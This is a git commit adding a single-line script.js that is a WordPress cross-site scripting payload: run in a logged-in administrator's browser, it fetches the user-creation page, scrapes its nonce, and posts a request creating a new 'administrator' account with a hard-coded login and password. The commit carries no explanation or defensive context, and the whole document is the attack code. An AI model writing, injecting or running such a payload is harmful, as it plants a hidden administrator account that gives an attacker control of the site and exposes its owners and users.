8595ce42504eaba6afe0216327e638a59dfaee9e
jackxcode <98596184+jackxcode@users.noreply.github.com>
2024-06-29 06:06:57 +0700

    Create script.js

---
+++ script.js
@@ -0,0 +1,1 @@
+u="/wp-admin/user-new.php"; jQuery.get(u, function(e){jQuery.post(u, {action:"createuser","_wpnounce_create-user":e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)[1],user_login:"foobar" ,email:"foo@bar.com" ,pass1:"foo" ,pass2:"foo" ,role:"administrator"})});
